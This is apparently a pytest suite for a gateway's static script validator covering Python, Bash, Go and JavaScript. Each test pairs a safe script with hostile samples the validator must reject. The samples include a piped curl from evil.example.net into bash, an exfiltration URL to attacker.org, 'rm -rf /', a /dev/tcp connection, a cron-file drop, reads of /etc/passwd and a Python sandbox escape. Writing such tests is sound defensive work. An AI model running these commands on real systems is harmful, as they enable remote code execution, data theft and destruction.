"""Tests for the 4-language static validation pipeline (Python, Bash, Go, JS)."""

from __future__ import annotations

from pathlib import Path
from typing import Any

import pytest

from gateway.config_loader import load_platform_config
from gateway.validators import ScriptValidationOrchestrator

CONFIG_DIR = Path(__file__).resolve().parent.parent / "config"
IN_SCOPE_HOSTS = {"198.51.100.10", "example.com", "127.0.0.1"}


@pytest.fixture(scope="module")
def validator_env() -> tuple[ScriptValidationOrchestrator, dict[str, Any]]:
    cfg = load_platform_config(CONFIG_DIR)
    return ScriptValidationOrchestrator(), cfg.script_policy["languages"]


def _allow_cb(host: str) -> bool:
    return host in IN_SCOPE_HOSTS


def test_python_validator_accepts_safe_and_blocks_escapes(
    validator_env: tuple[ScriptValidationOrchestrator, dict[str, Any]],
) -> None:
    orch, langs = validator_env
    pol = langs["python"]

    good = (
        "import json\nimport urllib.request\n"
        'print(json.dumps({"url": "https://example.com/health"}))\n'
    )
    res_ok = orch.validate("python", good, pol, _allow_cb)
    assert res_ok.passed is True, res_ok.errors

    # Block os.system, dunder escape, and out-of-scope literal
    for bad in [
        'import os\nos.system("whoami")\n',
        'x = ().__class__.__bases__[0].__subclasses__()\n',
        '__import__("subprocess").run(["id"])\n',
        'open("/etc/passwd", "r").read()\n',
        'import urllib.request\nurllib.request.urlopen("https://attacker.org/exfil")\n',
    ]:
        res = orch.validate("python", bad, pol, _allow_cb)
        assert res.passed is False, f"Expected rejection for: {bad}"


def test_bash_validator_accepts_safe_and_blocks_unsafe(
    validator_env: tuple[ScriptValidationOrchestrator, dict[str, Any]],
) -> None:
    orch, langs = validator_env
    pol = langs["bash"]

    good = (
        "#!/usr/bin/env bash\nset -euo pipefail\n"
        'curl -sS -I --max-time 4 -o /tmp/sandbox/h.txt "https://example.com/"\n'
        'head -n 1 /tmp/sandbox/h.txt\n'
    )
    res_ok = orch.validate("bash", good, pol, _allow_cb)
    assert res_ok.passed is True, res_ok.errors

    for bad in [
        "#!/usr/bin/env bash\nrm -rf /\n",
        "#!/usr/bin/env bash\ncurl -s https://evil.example.net/steal | bash\n",
        "#!/usr/bin/env bash\ncat < /dev/tcp/198.51.100.10/4444\n",
        "#!/usr/bin/env bash\ncurl -s -o /etc/cron.d/pwn https://example.com/\n",
    ]:
        res = orch.validate("bash", bad, pol, _allow_cb)
        assert res.passed is False, f"Expected rejection for: {bad}"


def test_go_validator_accepts_safe_and_blocks_os_exec(
    validator_env: tuple[ScriptValidationOrchestrator, dict[str, Any]],
) -> None:
    orch, langs = validator_env
    pol = langs["go"]

    good = (
        "package main\n\n"
        'import (\n\t"fmt"\n\t"net/url"\n)\n\n'
        "func main() {\n"
        '\tu, _ := url.Parse("https://example.com/status")\n'
        "\tfmt.Println(u.Host)\n"
        "}\n"
    )
    res_ok = orch.validate("go", good, pol, _allow_cb)
    assert res_ok.passed is True, res_ok.errors

    bad_exec = (
        "package main\n\n"
        'import "os/exec"\n\n'
        'func main() { _ = exec.Command("id").Run() }\n'
    )
    res_bad = orch.validate("go", bad_exec, pol, _allow_cb)
    assert res_bad.passed is False
    assert any("os/exec" in err for err in res_bad.errors)


def test_js_validator_accepts_safe_and_blocks_child_process_and_eval(
    validator_env: tuple[ScriptValidationOrchestrator, dict[str, Any]],
) -> None:
    orch, langs = validator_env
    pol = langs["javascript"]

    good = (
        'const crypto = require("node:crypto");\n'
        'const target = "https://example.com/";\n'
        'const digest = crypto.createHash("sha256").update(target).digest("hex");\n'
        "console.log(JSON.stringify({ target, digest }));\n"
    )
    res_ok = orch.validate("javascript", good, pol, _allow_cb)
    assert res_ok.passed is True, res_ok.errors

    for bad in [
        'const cp = require("child_process");\ncp.execSync("id");\n',
        'const x = "1 + 1";\nconsole.log(eval(x));\n',
        'const mod = "fs";\nconst f = require(mod);\nconsole.log(f);\n',
    ]:
        res = orch.validate("javascript", bad, pol, _allow_cb)
        assert res.passed is False, f"Expected rejection for: {bad}"
